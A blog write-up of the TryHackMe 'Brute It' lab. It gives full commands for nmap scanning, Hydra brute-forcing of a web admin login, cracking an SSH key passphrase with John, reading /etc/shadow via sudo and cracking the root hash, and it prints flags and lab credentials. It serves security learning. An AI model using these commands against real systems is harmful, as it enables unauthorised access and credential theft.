---
title: "TryHackMe – Brute It"
layout: single
collection: writeups
permalink: /writeups/tryhackme-brute-it/
classes: wide
tags: [tryhackme, brute-force, ssh, hydra]
---

![Brute It Screenshot](/assets/images/tryhackme-brute-it.png)

## 🧠 Target
- Brute-force login credentials over SSH  
- Hash cracking  
- Privilege escalation

## 🛠 Tools Used
- Hydra  
- Nmap  
- Kali Linux machine

## 🧭 Steps
Step 1. **Deployed the target machine `10.10.34.33`**
   Deployed the target machine with IP 10.10.34.33


   ![Tarhet Machine](/assets/images/brute-it/target-machine.png)

Step 2. **Performed an Nmap Scan `nmap -sS -sV  10.10.34.33`** 
   -Ran nmap -sS -sV 10.10.34.33 to discover open ports and services.
   -This revealed two open ports, 22 and 80.
   -The SSH port was open on 22.

   ![Nmap Scan](/assets/images/brute-it/nmap.png)

Step 3. **Discovered;**  
 -The version of SSH running is
   **OpenSSH 7.6p1**

 -The version of Apache running is
   **2.4.29**

 -The linux distro running is
   **Ubuntu**

   ![Ubuntu running](/assets/images/brute-it/ubuntu.png)


Step 4. **Searched for hidden directories on the web server.**  
  I used dirbuster command “dirsearch -u http://10.10.34.33”

   ![Dirsearch](/assets/images/brute-it/dirsearch.png)

   I discovered the hidden directory as **"/admin"**

Step 5. **Analyzed the Admin Login Page**  
   On the web browser, i visited http://10.10.34.3/admin. Amazing!. I got an admin login page.

   ![Admin](/assets/images/brute-it/hidden-admin-login-page.png)


Step 6. **Checked more details about the page on browser devtools**  
   By clicking F12 on my attack machine while on the page, I came across an interesting footprint.
   The username which was admin!! LOL

   We can see the username is admin we now need the password!!!

   ![Login leads](/assets/images/brute-it/User-login-info-devtools.png)


Step 7. **Ran Hydra to Brute-Force Credentials**  
   Used Hydra with the rockyou.txt wordlist to brute-force the admin login:
First Attempt (Slow Output)

"hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.34.33 http-post-form "/admin/:user=^USER^&pass=^PASS^login=^Login:Username or password invalid"" The initial attempt was too slow due to default settings.

   ![Hydra Brute Force](/assets/images/brute-it/slow-output.png)

   Optimized Attempt (Faster)

"hydra -l admin -P /usr/share/wordlists/rockyou.txt -e nsr -t 16 -vV 10.10.34.33 http-post-form "/admin/:user=^USER^&pass=^PASS^&login=Login:Username or password invalid""

 ![Hydra Command Execution](/assets/images/brute-it/hydra.png)

   Finally I got the password
[80][http-post-form] host: 10.10.245.181   login: admin   password: xavier

 ![Hydra Command Execution](/assets/images/brute-it/hydra1.png)

Step 8. **Logged in as Admin**  
   Logged in successfully and obtained user access to the system.
  
   Flag: THM{brut3_f0rce_is_e4sy}

![Amin Login](/assets/images/brute-it/login-success.png)

Step 9. **Cracked the RSA to gain John's sra key**  
   Copied the RSA private key content and saved it as .txt in my attacker machine.

   ![RSA](/assets/images/brute-it/RSA.png)

   ![Amin Login](/assets/images/brute-it/files.png)

  Commands Used:
“nano id_rsa”
“ssh2john id_rsa > hash” to convert it into a crackable hash
“john --wordlist=/usr/share/wordlists/rockyou.txt --format=SSH hash”
“john --show hash” to show cracked password

  ![RSA Crack](/assets/images/brute-it/rockinroll.png)

Step 10. **Gained Shell Access**  
   Successfully obtained user access to the system.


Commands:
“chmod 600 id_rsa”
“ssh -i id_rsa john@10.10.245.181”
sudo /bin/cat /etc/shadow | head -n 1

root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7::: = Save this as .txt in kali to get the root password.

“ls”
“cat user.txt”

 ![Shell](/assets/images/brute-it/root.png)
 
Flag: THM{a_password_is_not_a_barrier}
Web Flag: THM{brut3_f0rce_is_e4sy}


Step 11. **Privillege Escalation**  
   Checked for sudo privileges:

   Commands:
   "sudo -l"
   "sudo cat /root/root.txt"
   
 ![Privillege](/assets/images/brute-it/sudo.png)

Step 12. **Root Password**  
I had saved the above root content as file.txt . I used the 

   Commands:
"nano file" to check whether the file was present
"john --wordlist=/usr/share/wordlists/rockyou.txt file" to crack the password
"john --show file" to show the password

root.txt
THM{pr1v1l3g3_3sc4l4t10n}

 !Root Password](/assets/images/brute-it/root-password.png)
 
## 📘 Lessons Learned
- Account lockout policies are essential  
- Brute-force protection (e.g., fail2ban, rate-limiting) should be enforced  
- Avoid using default or guessable credentials
